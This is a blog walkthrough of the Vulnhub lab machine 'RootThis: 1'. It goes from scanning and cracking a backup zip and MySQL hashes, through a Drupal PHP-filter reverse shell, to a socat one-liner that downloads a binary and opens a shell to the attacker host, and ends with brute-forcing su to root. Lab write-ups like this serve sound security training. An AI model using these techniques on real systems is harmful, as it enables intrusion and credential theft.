---
layout:     post
title:      "Vulnhub.com - RootThis: 1"
date:       2019-02-26 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Today we're going to come back to some Vulnhub machines as there were many new added latelty. Firstly, we're going to play with machine called **RootThis** made by **Fred Wemeijer**.

* Author: [Fred Wemeijer](https://www.vulnhub.com/author/fred-wemeijer,595/)
* Download: [https://www.vulnhub.com/entry/rootthis-1,272/](https://www.vulnhub.com/entry/rootthis-1,272/)

### Solution

Firstly, we're going to start with `nmap` scan of the target. 

```bash
root@kali:~# nmap -sC -sV -sS -A 10.0.0.7
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 15:30 EST
Nmap scan report for 10.0.0.7
Host is up (0.00043s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:CA:99:96 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms 10.0.0.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.51 seconds
```

We can see that only `http` service is running on port `80`. I decided to run a full port scan with `-p-` option to see if there are any hidden serivices apart from this, but no luck. On the other hand, we only have one service to concetrate on.

```html
root@kali:~# curl 10.0.0.7
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Debian Default Page: It works</title>
  </head>
  <body>
    ...
  </body>
</html>

root@kali:~# 
```
After using `curl` to see what's hosted on the website, I can immediately see that that's the `Apache2 Default Page`. We can run `dirb` to see, if there is any directory apart from the root one. 

```bash
root@kali:~# dirb http://10.0.0.7

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb 21 15:33:01 2019
URL_BASE: http://10.0.0.7/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.7/ ----
+ http://10.0.0.7/backup (CODE:200|SIZE:270103)                                                                                                     
==> DIRECTORY: http://10.0.0.7/drupal/                                                                                                              
+ http://10.0.0.7/index.html (CODE:200|SIZE:10701)
```

It has found two interesting places - `backup` file and `drupal` directory. And by viewing `CHANGELOG.txt` we can see that's the version that is not vulnerable to `Drupalgeddon` attacks. 

```text
Drupal 7.61, 2018-11-07
-----------------------
- File upload validation functions and hook_file_validate() implementations are
  now always passed the correct file URI.
- The default form cache expiration of 6 hours is now configurable (API
  addition: https://www.drupal.org/node/2857751).
- Allowed callers of drupal_http_request() to optionally specify an explicit
  Host header.
- Allowed the + character to appear in usernames.
- PHP 7.2: Fixed Archive_Tar incompatibility.
- PHP 7.2: Removed deprecated function each().
- PHP 7.2: Avoid count() calls on uncountable variables.
- PHP 7.2: Removed deprecated create_function() call.
- PHP 7.2: Make sure variables are arrays in theme_links().
- Fixed theme-settings.php not being loaded on cached forms
- Fixed problem with IE11 & Chrome(PointerEvents enabled) & some Firefox scroll to the top of the page after dragging the bottom item with jquery 1.5 <-> 1.11

Drupal 7.60, 2018-10-18
------------------------
- Fixed security issues. See SA-CORE-2018-006.

Drupal 7.59, 2018-04-25
-----------------------
- Fixed security issues (remote code execution). See SA-CORE-2018-004.
```

But we still have the `backup` file. Let's download it using `wget`. 

```bash
root@kali:~# wget 10.0.0.7/backup
--2019-02-21 15:33:41--  http://10.0.0.7/backup
Connecting to 10.0.0.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 270103 (264K)
Saving to: ‘backup’

backup                                100%[======================================================================>] 263.77K  --.-KB/s    in 0.004s  

2019-02-21 15:33:41 (62.6 MB/s) - ‘backup’ saved [270103/270103]

root@kali:~# file backup
backup: Zip archive data, at least v2.0 to extract
root@kali:~# mv backup vulnhub/rootme/
root@kali:~# cd vulnhub/rootme/
root@kali:~/vulnhub/rootme# ls -la
total 272
drwxr-xr-x 2 root root   4096 Feb 21 15:34 .
drwxr-xr-x 3 root root   4096 Feb 21 15:34 ..
-rw-r--r-- 1 root root 270103 Dec  3 02:26 backup
```

It's a zip archive, but unfortunately password protected.

```bash
root@kali:~/vulnhub/rootme# unzip backup
Archive:  backup
[backup] dump.sql password: 
   skipping: dump.sql                incorrect password
```

As I have no clues about the password in other parts of the website, I've decided to spin up `frackzip` to crack the password with `rockyou.txt` wordlist. 

```bash
root@kali:~/vulnhub/rootme# fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt backup 
found file 'dump.sql', (size cp/uc 269921/1868829, flags 9, chk 118d)
checking pw udei9Qui                                

PASSWORD FOUND!!!!: pw == thebackup
```

This time we're lucky. Let's see what's inside the archive. 

```text
root@kali:~/vulnhub/rootme# unzip backup
Archive:  backup
[backup] dump.sql password: 
  inflating: dump.sql                
root@kali:~/vulnhub/rootme# ls -la
total 2100
drwxr-xr-x 2 root root    4096 Feb 22 08:43 .
drwxr-xr-x 3 root root    4096 Feb 21 15:34 ..
-rw-r--r-- 1 root root  270103 Dec  3 02:26 backup
-rw-r--r-- 1 root root 1868829 Dec  3 02:12 dump.sql
```

SQL dump? Probably for the whole Drupal installation. Let's see, if we can find the password to the service within this file.

```sql
--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES ('localhost','root','*7AFEAE5774E672996251E09B946CB3953FC67656','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','','','','',0,0,0,0,'unix_socket','','N','N','',0.000000),('localhost','webman','*9AF2F8E8C08165DC70FA4B4F8D40EA6EC84CB6D2','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','','','','',0,0,0,0,'','','N','N','',0.000000);
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;
```

Two entries. Now we can quickly paste them into Crackstation to try and crack them. 

```text
7AFEAE5774E672996251E09B946CB3953FC67656	MySQL4.1+	drupal
9AF2F8E8C08165DC70FA4B4F8D40EA6EC84CB6D2	MySQL4.1+	moranguita
```

Both of them are here. After trying to log into Drupal, we can see that only `webman` account is valid, so we'll use it for now. 

Our plan for now would be to firstly, activate the Drupal `php_filter` module that will allow us to enter `PHP` code inside articles or pages. 

![PHP Filter](/img/rootthis/php-filter-module.png){:class="img-responsive center-block"}

Now, in configuration we have to add the posibility to use this module by any user in the Drupal service. 

![PHP Filter Configuration](/img/rootthis/php-filter-configuration.png){:class="img-responsive center-block"}

And after all of this, let's create a new page with `PHP Reverse Shell from Pentest Monkey`. 

![Reverse Shell](/img/rootthis/php-reverse-shell.png){:class="img-responsive center-block"}

Before saving, we have to use `nc` to catch the connection.

```text
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
10.0.0.7: inverse host lookup failed: Unknown host
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.7] 37950
Linux RootThis 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 03:55:05 up 12 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Onto the antoher enumartion part! First thing I've found was note in `user` home directory.

```text
$ cd /home
$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Dec  1 03:57 .
drwxr-xr-x 22 root root 4096 Dec  1 03:55 ..
drwxr-xr-x  2 user user 4096 Dec  1 11:43 user
$ cd user
$ ls -la
total 28
drwxr-xr-x 2 user user 4096 Dec  1 11:43 .
drwxr-xr-x 3 root root 4096 Dec  1 03:57 ..
-rw------- 1 user user   12 Dec  1 11:31 .bash_history
-rw-r--r-- 1 user user  220 Dec  1 03:57 .bash_logout
-rw-r--r-- 1 user user 3526 Dec  1 03:57 .bashrc
-rw-r--r-- 1 user user  675 Dec  1 03:57 .profile
-rw-r--r-- 1 user user  217 Dec  1 11:43 MessageToRoot.txt
$ cat MessageToRoot.txt
Hi root,

Your password for this machine is weak and within the first 300 words of the rockyou.txt wordlist. Fortunately root is not accessible via ssh. Please update the password to a more secure one.

Regards,
user
```

That's a great hint, but we do not have possibility to use `su` for now, we have to upgrade our shell. Unfortunately simply doing `/bin/bash -i` did not help.

```text
$ /bin/bash -i
bash: cannot set terminal process group (497): Inappropriate ioctl for device
bash: no job control in this shell
```

Luckily, I've found [this](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) blog post, showinng method of upgrading our shell via `socat` tool. Let's follow instructions. 

On our victim:

```text
www-data@RootThis:/home/user$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.5:4444  
<li',pty,stderr,setsid,sigint,sane tcp:10.0.0.5:4444
```

And on Kali machine:

```text
root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444  
www-data@RootThis:/home/user$ su
Password:
su: Authentication failure
```

Now we can finally use `su`. But we also have to find a way to brute force the password. Another round of googling resulted in [sucrack](http://www.leidecker.info/projects/sucrack.shtml) tool - mutithreaded brute forcer for `su`. 

In order to get this on our victim machine, we firstly have to compile it on Kali using the instructions from the website. 

```text
root@kali:~/Downloads# tar -xvf sucrack-1.2.3.tar.gz
sucrack-1.2.3/
sucrack-1.2.3/AUTHORS
sucrack-1.2.3/COPYING
sucrack-1.2.3/ChangeLog
sucrack-1.2.3/INSTALL
sucrack-1.2.3/Makefile.am
sucrack-1.2.3/Makefile.in
sucrack-1.2.3/NEWS
sucrack-1.2.3/README
sucrack-1.2.3/VERSION
sucrack-1.2.3/aclocal.m4
sucrack-1.2.3/compile
sucrack-1.2.3/config.guess
sucrack-1.2.3/config.h.in
sucrack-1.2.3/config.sub
sucrack-1.2.3/configure
sucrack-1.2.3/configure.ac
sucrack-1.2.3/depcomp
sucrack-1.2.3/doc/
sucrack-1.2.3/doc/sucrack.1
sucrack-1.2.3/install-sh
sucrack-1.2.3/missing
sucrack-1.2.3/mkinstalldirs
sucrack-1.2.3/src/
sucrack-1.2.3/src/Makefile.am
sucrack-1.2.3/src/Makefile.in
sucrack-1.2.3/src/dictionary.c
sucrack-1.2.3/src/dictionary.h
sucrack-1.2.3/src/pty.c
sucrack-1.2.3/src/pty.h
sucrack-1.2.3/src/rewriter.c
sucrack-1.2.3/src/rewriter.h
sucrack-1.2.3/src/rules.c
sucrack-1.2.3/src/rules.h
sucrack-1.2.3/src/stat.c
sucrack-1.2.3/src/stat.h
sucrack-1.2.3/src/su.c
sucrack-1.2.3/src/su.h
sucrack-1.2.3/src/sucrack.c
sucrack-1.2.3/src/sucrack.h
sucrack-1.2.3/src/util.c
sucrack-1.2.3/src/util.h
sucrack-1.2.3/src/worker.c
sucrack-1.2.3/src/worker.h
```

After compilation, we can see that our binary is in the `src` directory.

```text
root@kali:~/Downloads/sucrack-1.2.3# cd src
root@kali:~/Downloads/sucrack-1.2.3/src# ls -la
total 432
drwxrwxrwx 3  501  501  4096 Feb 26 04:07 .
drwxrwxrwx 4  501  501  4096 Feb 26 04:07 ..
drwxr-xr-x 2 root root  4096 Feb 26 04:07 .deps
-rwxr-xr-x 1  501  501  9746 Sep 21  2007 dictionary.c
-rwxr-xr-x 1  501  501  2503 Sep 21  2007 dictionary.h
-rw-r--r-- 1 root root 26523 Feb 26 04:07 Makefile
-rwxr-xr-x 1  501  501   330 Sep 21  2007 Makefile.am
-rw-r--r-- 1  501  501 29778 Sep 21  2007 Makefile.in
-rwxr-xr-x 1  501  501  3314 Sep 21  2007 pty.c
-rwxr-xr-x 1  501  501  1896 Sep 21  2007 pty.h
-rwxr-xr-x 1  501  501  3256 Sep 21  2007 rewriter.c
-rwxr-xr-x 1  501  501  2136 Sep 21  2007 rewriter.h
-rwxr-xr-x 1  501  501  3392 Sep 21  2007 rules.c
-rwxr-xr-x 1  501  501  3065 Sep 21  2007 rules.h
-rwxr-xr-x 1  501  501  4852 Sep 21  2007 stat.c
-rwxr-xr-x 1  501  501  2496 Sep 21  2007 stat.h
-rwxr-xr-x 1  501  501  5890 Sep 21  2007 su.c
-rwxr-xr-x 1 root root 86048 Feb 26 04:07 sucrack
-rwxr-xr-x 1  501  501  9060 Dec  5  2007 sucrack.c
-rw-r--r-- 1 root root 26120 Feb 26 04:07 sucrack-dictionary.o
-rwxr-xr-x 1  501  501  1626 Sep 21  2007 sucrack.h
-rw-r--r-- 1 root root  9808 Feb 26 04:07 sucrack-pty.o
-rw-r--r-- 1 root root 10312 Feb 26 04:07 sucrack-rewriter.o
-rw-r--r-- 1 root root 17792 Feb 26 04:07 sucrack-rules.o
-rw-r--r-- 1 root root  7360 Feb 26 04:07 sucrack-stat.o
-rw-r--r-- 1 root root 33696 Feb 26 04:07 sucrack-sucrack.o
-rw-r--r-- 1 root root 22656 Feb 26 04:07 sucrack-su.o
-rw-r--r-- 1 root root  9864 Feb 26 04:07 sucrack-util.o
-rw-r--r-- 1 root root 16088 Feb 26 04:07 sucrack-worker.o
-rwxr-xr-x 1  501  501  2418 Sep 21  2007 su.h
-rwxr-xr-x 1  501  501  2201 Sep 21  2007 util.c
-rwxr-xr-x 1  501  501  2414 Sep 21  2007 util.h
-rwxr-xr-x 1  501  501  4726 Sep 21  2007 worker.c
-rwxr-xr-x 1  501  501  2116 Sep 21  2007 worker.h
root@kali:~/Downloads/sucrack-1.2.3/src# file sucrack
sucrack: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7cf5ecdaf77fd6b312c64b4d6e0919f3e43ef0c0, with debug_info, not stripped
```

We can use `SimpleHTTPServer` from `Python` to get it into victim machine. 

```text
root@kali:~/Downloads/sucrack-1.2.3/src# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.0.0.7 - - [26/Feb/2019 04:09:44] "GET /sucrack HTTP/1.1" 200 -
```

Using `wget`. 

```text
www-data@RootThis:/tmp$ wget 10.0.0.5:8000/sucrack
--2019-02-26 04:09:44--  http://10.0.0.5:8000/sucrack
Connecting to 10.0.0.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 86048 (84K) [application/octet-stream]
Saving to: 'sucrack'

sucrack             100%[===================>]  84.03K  --.-KB/s    in 0s      

2019-02-26 04:09:44 (283 MB/s) - 'sucrack' saved [86048/86048]
```

Now let's just `head` first 300 lines from `rockyou.txt`, once again use `SimpleHTTPServer` to get it into our target. 

```text
root@kali:~/Downloads# head -300 /usr/share/wordlists/rockyou.txt > smallrock.txt
root@kali:~/Downloads# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

Just like that. 

```text
www-data@RootThis:/tmp$ wget 10.0.0.5:8000/smallrock.txt
--2019-02-26 04:13:01--  http://10.0.0.5:8000/smallrock.txt
Connecting to 10.0.0.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2335 (2.3K) [text/plain]
Saving to: 'smallrock.txt'

smallrock.txt       100%[===================>]   2.28K  --.-KB/s    in 0s      

2019-02-26 04:13:01 (217 MB/s) - 'smallrock.txt' saved [2335/2335]
```

And we're ready to start cracking.

```text
www-data@RootThis:/tmp$ chmod +x sucrack
www-data@RootThis:/tmp$ export SUCRACK_SU_PATH=/bin/su
www-data@RootThis:/tmp$ export SUCRACK_AUTH_FAILURE="su: Authentication failure"
www-data@RootThis:/tmp$ ./sucrack -u root -w 4 smallrock.txt 
password is: 789456123
```

After finding password, last step is to `su` into `root` account and get the flag. 

```text
www-data@RootThis:/tmp$ su root
Password: 
root@RootThis:/tmp# cat /root/flag.txt 
Congratulations!

flag: a67d764105005a6a95a9c8c03bc95710bc396dccc4364704127170637b2bd39d
```